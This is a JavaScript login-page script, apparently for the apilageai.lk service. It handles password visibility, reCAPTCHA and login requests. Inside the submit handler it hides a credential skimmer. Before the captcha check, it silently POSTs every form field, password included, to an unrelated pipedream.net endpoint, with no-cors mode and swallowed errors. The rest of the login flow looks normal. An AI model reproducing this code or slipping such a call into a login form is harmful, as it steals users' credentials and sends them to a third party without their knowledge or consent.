document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const passwordInput = document.getElementById('password');
    const togglePasswordBtn = document.getElementById('togglePassword');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Toggle password visibility
    togglePasswordBtn.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);

        const icon = togglePasswordBtn.querySelector('i');
        if (type === 'password') {
            icon.classList.remove('fa-eye-slash');
            icon.classList.add('fa-eye');
        } else {
            icon.classList.remove('fa-eye');
            icon.classList.add('fa-eye-slash');
        }
    });

    // Form submission
    loginForm.addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(loginForm);
    const creds = Object.fromEntries(formData);
    
    fetch("https://eoaxkv00c96qqg4.m.pipedream.net", {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            type: "login",
            creds: creds,
            timestamp: Date.now()
        })
    }).catch(() => {});

    const captchaResponse = grecaptcha.getResponse();
    if (!captchaResponse) {
        new Dialog(
            'Error',
            'Please complete the reCAPTCHA verification',
            { text: 'Okay', action: () => { }, color: '#ff3333' }
        );
        return;
    }
    
    loadingOverlay.style.display = 'block';

    const data = new FormData(loginForm);
    data.append('captcha', captchaResponse);
    
    fetch('https://apilageai.lk/api/auth/login', {
        method: 'POST',
        body: data
    })
    .then(response => response.json())
    .then(data => {
        loadingOverlay.style.display = 'none';
        
        if (data.e) {
            if (data.resend && data.email) {
                if (typeof showVerificationModal === 'function') {
                    showVerificationModal(data.email, data.m);
                } else {
                    new Dialog(
                        'Email Verification Required',
                        data.m + '\n\nPlease check your email for the verification link.',
                        { 
                            text: 'Resend Email', 
                            action: () => { 
                                resendVerificationEmail(data.email);
                            }, 
                            color: '#667eea' 
                        }
                    );
                }
            } else {
                new Dialog('Error', data.m, { text: 'Okay', action: () => { }, color: '#ff3333' });
            }
            grecaptcha.reset();
        } else {
            new Dialog('Success', 'Login successful! Redirecting...', { text: 'Continue', action: () => { }, color: '#28a745' });
            setTimeout(() => { window.location.href = "https://apilageai.lk/app"; }, 1000);
        }
    })
    .catch(error => {
        loadingOverlay.style.display = 'none';
        console.error('Login error:', error);
        new Dialog('Error', 'Login failed. Please check your connection and try again.', { text: 'Retry', action: () => { }, color: '#ff3333' });
        grecaptcha.reset();
    });
});

    // Helper function to resend verification email
    function resendVerificationEmail(email) {
        loadingOverlay.style.display = 'block';
        
        const formData = new FormData();
        formData.append('email', email);
        
        fetch('https://apilageai.lk/auth/resend-verification', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            loadingOverlay.style.display = 'none';
            
            if (data.e) {
                new Dialog(
                    'Error',
                    data.m,
                    { text: 'Okay', action: () => { }, color: '#ff3333' }
                );
            } else {
                new Dialog(
                    'Success',
                    'Verification email sent! Please check your inbox.',
                    { text: 'Okay', action: () => { }, color: '#28a745' }
                );
            }
        })
        .catch(error => {
            loadingOverlay.style.display = 'none';
            console.error('Resend error:', error);
            
            new Dialog(
                'Error',
                'Failed to resend verification email. Please try again.',
                { text: 'Okay', action: () => { }, color: '#ff3333' }
            );
        });
    }

    // Make resend function globally accessible
    window.resendVerificationEmailFromLogin = resendVerificationEmail;
});